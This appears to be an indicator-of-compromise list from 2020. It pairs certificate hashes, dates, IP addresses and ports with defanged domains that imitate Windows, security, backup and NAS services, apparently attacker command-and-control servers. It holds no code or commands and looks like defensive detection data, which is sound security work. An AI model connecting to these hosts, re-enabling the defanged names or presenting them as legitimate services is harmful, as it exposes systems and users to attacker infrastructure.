e9b4b649c97cdd895d6a0c56015f2e68 1/30/20 144.202.12.197:80 CN=windefenceinfo[.]com c6c63024b18f0c5828bd38d285e6aa58 1/30/20 149.248.5.240:80 CN=sophosdefence[.]com e9b4b649c97cdd895d6a0c56015f2e68 1/30/20 149.28.246.25:80 CN=lsasswininfo[.]com f9af8b7ddd4875224c7ce8aae8c1b9dd 1/30/20 144.202.12.197:443 CN=windefenceinfo[.]com c6c63024b18f0c5828bd38d285e6aa58 1/30/20 149.28.246.25:443 CN=lsasswininfo[.]com f9af8b7ddd4875224c7ce8aae8c1b9dd 1/30/20 45.77.119.212:443 CN=taskshedulewin[.]com e1dc7cecd3cb225b131bdb71df4b3079 1/30/20 45.77.119.212:80 CN=taskshedulewin[.]com e1dc7cecd3cb225b131bdb71df4b3079 1/30/20 149.28.122.130:443 CN=renovatesystem[.]com 734c26d93201cf0c918135915fdf96af 1/30/20 45.32.170.9:80 CN=livecheckpointsrs[.]com 1de9e9aa8363751c8a71c43255557a97 1/30/20 149.248.58.11:80 CN=updatewinlsass[.]com 8c581979bd11138ffa3a25b895b97cc0 1/30/20 149.28.122.130:80 CN=renovatesystem[.]com 734c26d93201cf0c918135915fdf96af 1/30/20 207.148.8.61:80 CN=ciscocheckapi[.]com 97ca76ee9f02cfda2e8e9729f69bc208 1/31/20 81.17.25.210:443 CN=update-wind[.]com 877bf6c685b68e6ddf23a4db3789fcaa 1/31/20 31.7.59.141:80 CN=updatewinsoftr[.]com 07f9f766163c344b0522e4e917035fe1 2/2/20 155.138.214.247:80 CN=cleardefencewin[.]com 61df4864dc2970de6dcee65827cc9a54 2/2/20 155.138.214.247:443 CN=cleardefencewin[.]com 61df4864dc2970de6dcee65827cc9a54 2/2/20 45.76.231.195:443 CN=checkwinupdate[.]com d8e5dddeec1a9b366759c7ef624d3b8c 2/2/20 45.76.231.195:80 CN=checkwinupdate[.]com d8e5dddeec1a9b366759c7ef624d3b8c 2/3/20 46.19.142.154:443 CN=havesetup[.]net cd354c309f3229aff59751e329d8243a 2/3/20 95.179.219.169:80 CN=jomamba[.]best 80b7001e5a6e4bd6ec79515769b91c8b 2/3/20 140.82.60.155:80 CN=updatemanagir[.]us ec16be328c09473d5e5c07310583d85a 2/3/20 209.222.108.106:80 CN=timesshifts[.]com 2bb464585f42180bddccb50c4a4208a5 2/3/20 66.42.118.123:443 CN=conhostservice[.]com 6c21d3c5f6e8601e92ae167a7cff721c 2/4/20 80.240.18.106:443 CN=microsoftupdateswin[.]com 27cae092ad6fca89cd1b05ef1bb73e62 2/4/20 95.179.215.228:443 CN=iexploreservice[.]com 26010bebe046b3a33bacd805c2617610 2/12/20 155.138.216.133:443 CN=defenswin[.]com e5005ae0771fcc165772a154b7937e89 2/12/20 45.32.130.5:443 CN=avrenew[.]com f32ee1bb35102e5d98af81946726ec1b 2/14/20 45.76.167.35:443 CN=freeallsafe[.]com 85f743a071a1d0b74d8e8322fecf832b 2/14/20 45.63.95.187:443 CN=easytus[.]com 17de38c58e04242ee56a9f3a94e6fd53 2/17/20 45.77.89.31:443 CN=besttus[.]com 2bda8217bdb05642c995401af3b5c1f3 2/17/20 95.179.147.215:443 CN=windefens[.]com 57725c8db6b98a3361e0d905a697f9f8 2/17/20 155.138.216.133:443 CN=defenswin[.]com c07774a256fc19036f5c8c60ba418cbf 2/17/20 104.238.190.126:443 CN=aaatus[.]com 4039af00ce7a5287a3e564918edb77cf 2/17/20 144.202.83.4:443 CN=greattus[.]com 7f0fa9a608090634b42f5f17b8cecff0 2/17/20 104.156.245.0:443 CN=comssite[.]com f5bb98fafe428be6a8765e98683ab115 2/17/20 45.32.30.162:443 CN=bigtus[.]com 698fc23ae111381183d0b92fe343b28b 2/17/20 108.61.242.184:443 CN=livetus[.]com 8bedba70f882c45f968c2d99b00a708a 2/17/20 207.148.15.31:443 CN=findtus[.]com 15f07ca2f533f0954bbbc8d4c64f3262 2/17/20 149.28.15.247:443 CN=firsttus[.]com 88e8551f4364fc647dbf00796536a4c7 2/21/20 155.138.136.182:443 CN=worldtus[.]com b31f38b2ccbbebf4018fe5665173a409 2/25/20 45.77.58.172:443 CN=freeoldsafe[.]com a46e77b92e1cdfec82239ff54f2c1115 2/25/20 45.77.58.172:443 CN=freeoldsafe[.]com a46e77b92e1cdfec82239ff54f2c1115 2/26/20 108.61.72.29:443 CN=myserviceconnect[.]net 9f551008f6dcaf8e6fe363caa11a1aed 2/27/20 216.155.157.249:443 CN=myserviceupdater[.]com 4c6a2c06f1e1d15d6be8c81172d1c50c 2/28/20 45.77.98.157:443 CN=topservicesbooster[.]com ba4b34962390893852e5cc7fa7c75ba2 2/28/20 104.156.250.132:443 CN=myservicebooster[.]com 89be5670d19608b2c8e261f6301620e1 2/28/20 149.28.50.31:443 CN=topsecurityservice[.]net 77e2878842ab26beaa3ff24a5b64f09b 2/28/20 149.28.55.197:443 CN=myyserviceupdater[.]com 0dd8fde668ff8a301390eef1ad2f9b83 2/28/20 207.246.67.70:443 CN=servicesecurity[.]org c88098f9a92d7256425f782440971497 2/28/20 63.209.33.131:443 CN=serviceupdates[.]net 16e86a9be2bdf0ddc896bc48fcdbb632 2/29/20 45.77.206.105:443 CN=myservicebooster[.]net 6e09bb541b29be7b89427f9227c30a32 2/29/20 140.82.5.67:443 CN=servicesbooster[.]org 42d2d09d08f60782dc4cded98d7984ed 2/29/20 108.61.209.123:443 CN=brainschampions[.]com 241ab042cdcb29df0a5c4f853f23dd31 2/29/20 104.156.227.250:443 CN=servicesbooster[.]com f45f9296ff2a6489a4f39cd79c7f5169 2/29/20 140.82.10.222:443 CN=topservicesecurity[.]net b9375e7df4ee0f83d7abb179039dc2c5 2/29/20 149.28.35.35:443 CN=topservicesecurity[.]org 82bd8a2b743c7cc3f3820e386368951d 2/29/20 207.148.21.17:443 CN=topserviceupdater[.]com ece184f8a1309b781f912d4f4d65738e 2/29/20 45.77.153.72:443 CN=topservicesupdate[.]com 8330c3fa8ca31a76dc8d7818fd378794 3/1/20 140.82.10.222:80 CN=topservicesecurity[.]net b9375e7df4ee0f83d7abb179039dc2c5 3/1/20 207.148.21.17:80 CN=topserviceupdater[.]com ece184f8a1309b781f912d4f4d65738e 3/1/20 108.61.90.90:443 CN=topservicesecurity[.]com 696aeb86d085e4f6032e0a01c496d26c 3/1/20 45.32.130.5:80 CN=avrenew[.]com f32ee1bb35102e5d98af81946726ec1b 3/2/20 217.69.15.175:443 CN=serviceshelpers[.]com 9a437489c9b2c19c304d980c17d2e0e9 3/2/20 155.138.135.182:443 CN=topservicesupdates[.]com b9deff0804244b52b14576eac260fd9f 3/2/20 95.179.210.8:80 CN=serviceuphelper[.]com bb65efcead5b979baee5a25756e005d8 3/2/20 45.76.45.162:443 CN=boostsecuritys[.]com 7d316c63bdc4e981344e84a017ae0212 3/4/20 108.61.176.237:443 CN=yoursuperservice[.]com 7424aaede2f35259cf040f3e70d707be 3/4/20 207.246.67.70:443 CN=servicesecurity[.]org d66cb5528d2610b39bc3cecc20198970 3/6/20 188.166.52.176:443 CN=top-servicebooster[.]com f882c11b294a94494f75ded47f6f0ca0 3/7/20 149.248.56.113:443 CN=topservicehelper[.]com 2a29e359126ec5b746b1cc52354b4adf 3/8/20 199.247.13.144:443 CN=hakunamatatata[.]com e2cd3c7e2900e2764da64a719096c0cb 3/8/20 95.179.210.8:443 CN=serviceuphelper[.]com bb65efcead5b979baee5a25756e005d8 3/8/20 207.246.67.70:443 CN=servicesecurity[.]org d89f6bdc59ed5a1ab3c1ecb53c6e571c 3/9/20 194.26.29.230:443 CN=secondserviceupdater[.]com c30a4809c9a77cfc09314a63f7055bf7 3/9/20 194.26.29.229:443 CN=firstserviceupdater[.]com bc86a3087f238014b6c3a09c2dc3df42 3/9/20 194.26.29.232:443 CN=fourthserviceupdater[.]com 3dc6d12c56cc79b0e3e8cd7b8a9c320b 3/9/20 194.26.29.234:443 CN=sixthserviceupdater[.]com 951e29ee8152c1e7f63e8ccb6b7031c1 3/9/20 194.26.29.235:443 CN=seventhserviceupdater[.]com abe1ce0f83459a7fe9c72839fc46330b 3/9/20 194.26.29.236:443 CN=eighthserviceupdater[.]com c7a539cffdd230a4ac9a4754c2c68f12 3/9/20 194.26.29.237:443 CN=ninethserviceupdater[.]com 1d1f7bf2c0eec7a3a0221fd473ddbafc 3/9/20 194.26.29.225:443 CN=seventeenthservicehelper[.]com 6b1e0621f4d891b8575a229384d0732d 3/9/20 194.26.29.227:443 CN=nineteenthservicehelper[.]com 38756ffb8f2962f6071e770637a2d962 3/9/20 194.26.29.242:443 CN=thirdservicehelper[.]com 3b911032d08ff4cb156c064bc272d935 3/9/20 194.26.29.244:443 CN=tenthservicehelper[.]com a2d9b382fe32b0139197258e3e2925c4 3/9/20 194.26.29.226:443 CN=eighteenthservicehelper[.]com 4acbca8efccafd92da9006d0cc91b264 3/9/20 194.26.29.243:443 CN=ninthservicehelper[.]com 0760ab4a6ed9a124aabb8c377beead54 3/9/20 194.26.29.201:443 CN=secondservicehelper[.]com d8a8d0ad9226e3c968c58b5d2324d899 3/9/20 194.26.29.202:443 CN=thirdservicehelper[.]com 0d3b79158ceee5b6ce859bb3fc501b02 3/9/20 194.26.29.220:443 CN=fourservicehelper[.]com 831e0445ea580091275b7020f2153b08 3/11/20 207.246.67.70:80 CN=servicesecurity[.]org d89f6bdc59ed5a1ab3c1ecb53c6e571c 3/13/20 165.227.196.0:443 CN=twentiethservicehelper[.]com 977b4abc6307a9b3732229d4d8e2c277 3/14/20 45.141.86.91:443 CN=thirdservice-developer[.]com edc2680e3797e11e93573e523bae7265 3/14/20 194.26.29.219:443 CN=firstservisehelper[.]com 6b444a2cd3e12d4c3feadec43a30c4d6 3/14/20 45.141.86.93:443 CN=fifthservice-developer[.]com 60e7500c809f12fe6be5681bd41a0eda 3/15/20 45.141.86.90:443 CN=secondservice-developer[.]com de9460bd6b1badb7d8314a381d143906 3/15/20 45.141.86.84:443 CN=firstservice-developer[.]com 6385acd425e68e1d3fce3803f8ae06be 3/17/20 45.141.86.96:443 CN=eithtservice-developer[.]com e1d1fb4a6f09fb54e09fb27167028303 3/17/20 45.141.86.92:443 CN=fourthservice-developer[.]com 5b5375bf30aedfa3a44d758fe42fccba 3/18/20 45.141.86.94:443 CN=sixthservice-developer[.]com 4d42bea1bfc7f1499e469e85cf75912c 3/18/20 108.61.209.121:443 CN=service-booster[.]com 692ed54fb1fb189c36d2f1674db47e45 3/18/20 134.122.116.114:443 CN=service-helpes[.]com ad0914f72f1716d810e7bd8a67c12a71 3/18/20 209.97.130.197:443 CN=helpforyourservice[.]com 00fe3cc532f876c7505ddbf5625de404 3/18/20 192.241.143.121:443 CN=serviceshelps[.]com e50998208071b4e5a70110b141542747 3/18/20 45.141.86.95:443 CN=seventhservice-developer[.]com 413ca4fa49c3eb6eef0a6cbc8cac2a71 3/18/20 198.211.116.199:443 CN=actionshunter[.]com 8e5bedbe832d374b565857cce294f061 3/18/20 45.141.86.155:443 CN=sexyservicee[.]com cca37e58b23de9a1db9c3863fe2cd57c 3/19/20 194.26.29.239:443 CN=eleventhserviceupdater[.]com 7e0fcb78055f0eb12bc8417a6933068d 3/19/20 45.141.86.206:443 CN=servicedhunter[.]com fdefb427dcf3f0257ddc53409ff71d22 3/19/20 45.141.86.92:443 CN=service-updateer[.]com 51ba9c03eac37751fe06b7539964e3de 3/19/20 134.122.116.59:443 CN=servicedbooster[.]com db7797a20a5a491fb7ad0d4c84acd7e8 3/19/20 134.122.118.46:443 CN=servicedpower[.]com 7b57879bded28d0447eea28bacc79fb5 3/19/20 134.122.124.26:443 CN=serviceboostnumberone[.]com 880982d4781a1917649ce0bb6b0d9522 3/20/20 45.141.86.97:443 CN=ninethservice-developer[.]com e4a720edfcc7467741c582cb039f20e0 3/20/20 178.62.247.205:443 CN=top-serviceupdater[.]com a45522bd0a26e07ed18787c739179ccb 3/20/20 159.203.36.61:443 CN=yourserviceupdater[.]com 7b422c90dc85ce261c0a69ba70d8f6b5 3/20/20 134.122.20.117:443 CN=fifthserviceupdater[.]com 99aa16d7fc34cdcc7dfceab46e990f44 3/23/20 165.22.125.178:443 CN=servicemonsterr[.]com 82abfd5b55e14441997d47aee4201f6d 3/24/20 69.55.60.140:443 CN=boostyourservice[.]com 7f3787bf42f11da321461e6db7f295d1 3/24/20 45.141.86.98:443 CN=tenthservice-developer[.]com eef29bcbcba1ce089a50aefbbb909203 3/26/20 178.79.132.82:443 CN=developmasters[.]com 5cf480eba910a625e5e52e879ac5aecb 3/26/20 194.26.29.247:443 CN=thirteenthservicehelper[.]com 2486df3869c16c0d9c23a83cd61620c2 5/4/20 159.65.216.127:443 CN=info-develop[.]com 5f7a5fb72c6689934cc5d9c9a681506b 9/22/20 69.61.38.155:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=gtrsqer[.]com d37ba4a4b1885e96ff54d1f139bf3f47 9/22/20 96.9.225.144:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=hakunaman[.]com 4408ba9d63917446b31a0330c613843d 9/22/20 96.9.209.216:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=caonimas[.]com d921dd1ba03aaf37d5011020577e8147 9/22/20 107.173.58.176:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=chalengges[.]com dfeb6959b62aff0b93ca20fd40ef01a8 9/22/20 96.9.225.143:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=reginds[.]com 05c03b62dea6ec06006e57fd0a6ba22e 9/22/20 69.61.38.156:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=errvghu[.]com c14a892f8203a04c7e3298edfc59363a 9/22/20 45.34.6.229:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=harddagger[.]com 7ed16732ec21fb3ec16dbb8df0aa2250 9/22/20 45.34.6.226:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=getinformationss[.]com 1788068aff203fa9c51d85bf32048b9c 9/22/20 45.34.6.225:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=gameleaderr[.]com 0fff2f721ad23648175d081672e77df4 9/22/20 107.173.58.185:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=razorses[.]com b960355ba112136f93798bf85e6392bf 9/22/20 107.173.58.183:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=nomadfunclub[.]com a3d4e6d1f361d9c335effdbd33d12e79 9/22/20 107.173.58.175:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=bouths[.]com e13fbdff954f652f14faf11b735c0ef8 9/22/20 185.184.223.194:443 C=US,ST=CA,L=Texas,O=lol,OU=,CN=regbed[.]com 67310b30bada4f77f8f336438890d8f2 9/22/20 109.70.236.134:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=vnuret[.]com ae74cbb9838688363b7928b06963c40a 9/23/20 64.44.131.103:443 C=US,ST=TX,L=Texas,O=serviceswork,OU=,CN=serviceswork[.]net af518cc031807f43d646dc508685bcd3 9/23/20 69.61.38.157:443 C=US,ST=TX,L=Texas,O=office,OU=,CN=moonshardd[.]com c8fd81d6d3c8cbb8256c470a613a7c7b 9/23/20 193.142.58.129:443 C=US,ST=TX,L=Texas,O=zapored,OU=,CN=zapored[.]com 5a22c3c8a0ed6482cad0e2b867c4c10c 9/23/20 45.34.6.223:443 C=US,ST=TX,L=Texas,O=office,OU=,CN=hurrypotter[.]com bf598ba46f47919c264514f10ce80e34 9/23/20 107.173.58.179:443 C=US,ST=TX,L=Texas,O=office,OU=,CN=biliyilish[.]com 1c8243e2787421373efcf98fc0975031 9/23/20 45.34.6.222:443 C=US,ST=TX,L=Texas,O=dagger,OU=,CN=daggerclip[.]com 576d65a68900b270155c2015ac4788bb 9/23/20 107.173.58.180:443 C=US,ST=TX,L=Texas,O=office,OU=,CN=blackhoall[.]com 69643e9b1528efc6ec9037b60498b94c 9/23/20 107.173.58.182:443 C=US,ST=TX,L=Texas,O=office,OU=,CN=checkhunterr[.]com ca9b7e2fcfd35f19917184ad2f5e1ad3 9/23/20 45.34.6.221:443 C=US,ST=TX,L=Texas,O=office,OU=,CN=check4list[.]com e5e0f017b00af6f020a28b101a136bad 9/24/20 213.252.244.62:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=ayiyas[.]com 8367a1407ae999644f25f665320a3899 9/24/20 185.25.50.167:443 C=US,ST=TX,L=Texas,O=office,OU=,CN=chainnss[.]com 34a78f1233e53010d29f2a4fa944c877 9/30/20 88.119.171.75:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=martahzz[.]com eaebbe5a3e3ea1d5992a4dfd4af7a749 10/1/20 88.119.171.74:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=jonsonsbabyy[.]com adc8cd1285b7ae62045479ed39aa37f5 10/1/20 88.119.171.55:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=tiancaii[.]com bfe1fd16cd4169076f3fbaab5afcbe12 10/1/20 88.119.171.67:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=cantliee[.]com c8a623eb355d172fc3e083763934a7f7 10/1/20 88.119.171.76:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=realgamess[.]com 0ac5659596008e64d4d0d90dfb6abe7c 10/1/20 88.119.171.68:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=maybebaybe[.]com 48003b6b638dc7e79e75a581c58f2d77 10/1/20 88.119.171.69:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=saynoforbubble[.]com 5c75a6bbb7454a04b9ea26aa80dfbcba 10/1/20 88.119.171.73:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=chekingking[.]com e391c997b757424d8b2399cba4733a60 10/1/20 88.119.171.77:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=wondergodst[.]com 035697cac0ee92bb4d743470206bfe9a 10/1/20 88.119.171.78:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=zetrexx[.]com fc133bed713608f78f9f112ed7498f32 10/1/20 213.252.244.38:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=mountasd[.]com 8ead6021e2a5b9191577c115d4e68911 10/1/20 107.173.58.184:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=pudgeee[.]com 1c9949d20441df2df09d13778b751b65 10/1/20 88.119.174.109:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=loockfinderrs[.]com c0ddfc954aa007885b467f8c4f70ad75 10/1/20 88.119.174.110:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=puckhunterrr[.]com ee63098506cb82fc71a4e85043d4763f 10/1/20 88.119.174.114:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=voiddas[.]com 422b020be24b346da826172e4a2cf1c1 10/1/20 88.119.174.116:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=sibalsakie[.]com 8d8f046e963bcd008fe4bbed01bed4c8 10/1/20 88.119.174.117:443 C=US,ST=TX,L=TExas,O=lol,OU=,CN=rapirasa[.]com c381fb63e9cb6b0fc59dfaf6e8c40af3 10/1/20 88.119.174.118:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=raidbossa[.]com add6b742d0f992d56bede79888eef413 10/1/20 88.119.174.119:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=lindasak[.]com 9bbd073033e34bfd80f658f0264f6fae 10/1/20 88.119.174.121:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=bithunterr[.]com 9afef617897e7089f59c19096b8436c8 10/1/20 88.119.174.120:443 C=US,ST=TX,L=Texas,O=office,OU=,CN=giveasees[.]com 3f366e5f804515ff982c151a84f6a562 10/1/20 88.119.174.107:443 C=US,ST=TX,L=Texas,O=office,OU=,CN=shabihere[.]com c2f99054e0b42363be915237cb4c950b 10/1/20 88.119.174.125:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=tarhungangster[.]com 4ac8ac12f1763277e35da08d8b9ea394 10/1/20 88.119.174.126:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=imagodd[.]com 7080547306dceb90d809cb9866ed033c 10/1/20 88.119.174.127:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=raaidboss[.]com 03037dff61500d52a37efd4b4f520518 10/1/20 88.119.174.128:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=sunofgodd[.]com 959bed7a2662d7274b303f3b120fddea 10/1/20 213.252.244.126:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=hungrrybaby[.]com 1d28556cc80df9627c20316358b625d6 10/1/20 213.252.244.170:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=loxliver[.]com 85e65803443046f921b9a0a9b8cc277c 10/1/20 213.252.246.154:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=servicegungster[.]com 9df6ba82461aa0594ead03993c0e4c42 10/5/20 5.2.64.113:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=qascker[.]com 18aadee1b82482c3cd5ebe32f3628f3f 10/7/20 5.2.79.122:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=cheapshhot[.]com 94bc44bd438d2e290516d111782badde 10/7/20 88.119.171.94:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=havemosts[.]com f0ede92cb0899a9810a67d716cdbebe2 10/7/20 5.2.64.133:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=mixunderax[.]com e0f9efedd11d22a5a08ffb9c4c2cbb5a 10/7/20 5.2.64.135:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=bugsbunnyy[.]com 4aa2acabeb3ff38e39ed1d840124f108 10/7/20 5.2.72.202:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=sweetmonsterr[.]com c04034b78012cca7dcc4a0fb5d7bb551 10/7/20 88.119.175.153:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=zhameharden[.]com 2670bf08c43d995c74b4b83383af6a69 10/7/20 213.252.245.71:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=serviceboosterr[.]com 127cc347b711610c3bcee434eb8bf822 10/7/20 213.252.246.144:443 C=US,ST=TX,L=Texas,O=US,OU=,CN=servicewikii[.]com b3e7ab478ffb0213017d57a88e7b2e3b 10/7/20 5.2.64.149:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=sobcase[.]com 188f603570e7fa81b92906af7af177dc 10/7/20 5.2.64.144:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=unlockwsa[.]com 22d7f35e624b7bcee7bb78ee85a7945c 10/7/20 88.119.174.139:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=serviceupdatter[.]com 12c6e173fa3cc11cc6b09b01c5f71b0c 10/7/20 88.119.174.133:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=service-boosterr[.]com 28435684c76eb5f1c4b48b6bbc4b22af 10/7/20 88.119.175.214:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=dotmaingame[.]com 9c2d64cf4e8e58ef86d16e9f77873327 10/7/20 5.2.72.200:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=wodemayaa[.]com f6f484baf1331abf55d06720de827190 10/7/20 5.2.79.10:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=hybriqdjs[.]com d8eacda158594331aec3ad5e42656e35 10/7/20 5.2.79.12:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=gunsdrag[.]com 29032dd12ea17fc37ffff1ee94cc5ba8 10/7/20 5.2.79.121:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=gungameon[.]com eaf32b1c2e31e4e7b6d5c3e6ed6bff3d 10/7/20 5.2.64.174:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=quwasd[.]com 442680006c191692fcc3df64ec60d8fa 10/7/20 5.2.64.172:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=remotessa[.]com 0593cbf6b3a3736a17cd64170e02a78d 10/7/20 5.2.64.167:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=secondlivve[.]com 38df81824bd8cded4a8fa7ad9e4d1f67 10/7/20 5.2.64.182:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=luckyhunterrs[.]com 99dbe71ca7b9d4a1d9f722c733b3f405 10/7/20 88.119.171.97:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=servicesupdater[.]com 7d7199ffa40c50b6e5b025b8cb2661b2 10/7/20 88.119.171.96:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=servicemount[.]com f433d25a0dad0def0510cd9f95886fdb 10/7/20 96.9.209.217:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=fastbloodhunter[.]com e84c7aa593233250efac903c19f3f589 10/7/20 69.61.38.132:443 C=US,ST=CA,L=Mountainvew,O=Office,OU=,CN=kungfupandasa[.]com e6e80f6eb5cbfc73cde40819007dcc53 10/13/20 45.147.230.131:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=bakcup-monster[.]com 4fdeab3dad077589d52684d35a9ea4ab 10/13/20 45.147.229.92:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=bakcup-checker[.]com b70cdb49b26e6e9ba7d0c42d5f3ed3cb 10/13/20 45.147.229.68:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=backup-simple[.]com 57024c1fe5c4acaf30434ba1f58f9144 10/13/20 45.147.229.52:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=backup-leader[.]com ec5496048f1962494d239d377e53db0c 10/13/20 45.147.229.44:443 C=US,ST=TX,L=Texsa,O=lol,OU=,CN=backup-helper[.]com 938593ac1c8bdb2c5256540d7c8476c8 10/14/20 45.147.230.87:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=nasmastrservice[.]com cced46e0a9b6c382a97607beb95f68ab 10/14/20 45.147.230.159:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=service-leader[.]com e912980fc8e9ec1e570e209ebb163f65 10/14/20 45.147.230.141:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=service-checker[.]com 39d7160ce331a157d3ecb2a9f8a66f12 10/14/20 45.147.230.140:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=nas-simple-helper[.]com d9ca73fe10d52eef6952325d102f0138 10/14/20 45.147.230.133:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=nas-leader[.]com 920d04330a165882c8076c07b00e1d93 10/14/20 45.147.230.132:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=boost-servicess[.]com 771463611a43ee35a0ce0631ef244dee 10/14/20 45.147.229.180:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=elephantdrrive[.]com 1e4a794da7d3c6d0677f7169fbe3b526 10/14/20 45.147.230.159:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=service-leader[.]com 9c7fe10135f6ad96ded28fac51b79dfd 10/15/20 45.147.230.132:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=boost-servicess[.]com a78c0e2920e421667ae734d923dd5ca6 10/15/20 45.138.172.95:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=service-hellper[.]com a0b2378ceae498f46401aadeb278fb31 10/16/20 108.62.12.119:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=top-backuphelper[.]com e95bb7804e3add830496bd36664ed339 10/16/20 108.62.12.105:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=best-nas[.]com 8d5dc95b3bd4d16a3434b991a09bf77e 10/16/20 108.62.12.114:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=top-backupservice[.]com d5de2f5d2ca29da1724735cdb8fbc63f 10/16/20 108.62.12.116:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=bestservicehelper[.]com 9c7396ecd107ee8f8bf5521afabb0084 10/16/20 45.147.230.141:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=service-checker[.]com 1134a6f276f4297a083fc2a605e24f70 10/16/20 45.147.230.140:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=nas-simple-helper[.]com 2150045f476508f89d9a322561b28ff9 10/16/20 45.147.230.133:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=nas-leader[.]com f4ddc4562e5001ac8fdf0b7de079b344 10/19/20 74.118.138.137:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=top3-services[.]com 75fb6789ec03961c869b52336fa4e085 10/19/20 74.118.138.115:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=simple-backupbooster[.]com 9f5e845091015b533b59fe5e8536a435 10/19/20 108.177.235.53:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=best-backup[.]com 4b78eaa4f2748df27ebf6655ea8a7fe9 10/19/20 74.118.138.138:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=topbackup-helper[.]com bcccda483753c82e62482c55bc743c16 10/21/20 45.153.241.1:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=backup1helper[.]com 672c66dd4bb62047bb836bd89d2e1a65 10/21/20 45.153.240.240:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=checktodrivers[.]com 6825409698a326cc319ca40cd85a602e 10/21/20 45.153.240.194:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=driver1master[.]com 7f9be0302da88e0d322e5701d52d4128 10/21/20 45.153.240.138:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=boost-yourservice[.]com 2c6a0856d1a75b303337ac0807429e88 10/21/20 45.153.240.136:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=backup1master[.]com 6559dbf8c47383b7b493500d7ed76f6a 10/23/20 45.153.240.157:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=driver1updater[.]com 7bd044e0a6689ef29ce23e3ccb0736a3 10/23/20 45.153.240.178:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=service1updater[.]com 